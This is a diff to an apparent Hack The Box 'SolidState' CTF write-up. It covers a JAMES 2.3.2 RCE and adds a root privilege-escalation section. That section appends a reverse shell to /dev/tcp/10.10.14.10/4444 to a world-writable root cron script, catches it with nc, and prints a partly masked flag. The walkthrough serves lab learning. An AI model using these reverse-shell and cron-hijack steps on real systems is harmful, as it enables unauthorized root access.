@@ -153,7 +153,7 @@ Apache JAMES (`Java Apache Mail Enterprise Server`) is an open-source `Java-base
 
 <br />
 
-Our research revealed that `Apache JAMES 2.3.2` is vulnerable to an authenticated Remote Command Execution (RCE).
+Our research revealed that `Apache JAMES 2.3.2` is vulnerable to an authenticated Remote Command Execution (RCE) vulnerability.
 
 <br />
 
@@ -406,7 +406,7 @@ This way, we spawn a `bash` shell instead of the `rbash` assigned to user `mindy
 
 As we saw earlier, this application is vulnerable to a RCE. 
 
-Let's inspect further the exploit code:
+Let's take a closer look at the exploit code:
 
 <br />
 
@@ -497,7 +497,7 @@ The logic can be broken down as follows:
 
 2. Establish socket connections to ports `4555` (admin) and `25` (SMTP).
 
-3. Create a user and send the payload via `SMTP` to write it into a startup script location.
+3. Create a user and send the payload via `SMTP` that writes to a startup script location.
 
 4. Wait for an `SSH` login to trigger execution of the payload.
 
@@ -507,7 +507,7 @@ The logic can be broken down as follows:
 
 <br />
 
-To better understand the exploitation process, we will perform it manually step by step.
+To better understand the exploitation process, we'll replicate it manually step by step.
 
 First, we authenticate to JAMES and create the user:
 
@@ -534,7 +534,7 @@ Connection closed by foreign host.
 
 <br />
 
-Then, we send an email to this user containing the reverse shell payload:
+Then, we send an email to this user with the `reverse shell` payload embedded in the message body:
 
 <br />
 
@@ -590,5 +590,133 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
 <br />
 
 # Privilege Escalation: mindy -> root 
+
+<br />
+
+While enumerating the system, we detect a crontab with `pspy` (important to run the 32 bits version):
+
+<br />
+
+```bash
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp/Privesc$ ./pspy32
+./pspy32
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done 
+...[split]...
+2025/08/13 15:00:01 CMD: UID=0     PID=1943   | /bin/sh -c python /opt/tmp.py
+...[split]...
+```
+
+<br />
+
+Apparently, the superuser `root` is running a python script named `tmp.py` into the `/opt` directory.
+
+<br />
+
+```python 
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+except:
+     sys.exit()
+
+```
+
+<br />
+
+If we run a `ls -l` to this directory, we have all permissions over this file, including the write one:
+
+<br />
+
+```bash
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -l /opt
+ls -l /opt
+total 8
+drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
+-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
+```
+
+<br />
+
+To exploit this, we append the following code line to `tmp.py` using `echo`:
+
+<br />
+
+```bash
+echo "os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'\")" >> tmp.py
+```
+
+<br />
+
+The resultant code is the following:
+
+<br />
+
+```bash
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+except:
+     sys.exit()
+
+os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'")
+```
+
+<br />
+
+After waiting 3-4 minutes, we receive the shell:
+
+<br />
+
+```bash
+❯ sudo nc -nlvp 4444
+[sudo] contraseña para theredp4nther: 
+Listening on 0.0.0.0 4444
+Connection received on 10.10.10.51 33508
+bash: cannot set terminal process group (1207): Inappropriate ioctl for device
+bash: no job control in this shell
+root@solidstate:~# whoami
+
+root
+```
+
+<br />
+
+And we can retrieve the `root.txt` flag:
+
+<br />
+
+```bash
+root@solidstate:~# cat root.txt
+
+d21471ab00e5c4802a01369d3fxxxxxx
+```
+
+<br />
+
+SolidState pwned!
+
+Hope you learned and enjoyed during the process.
+
+Keep hacking!❤️ 
 
 <br />
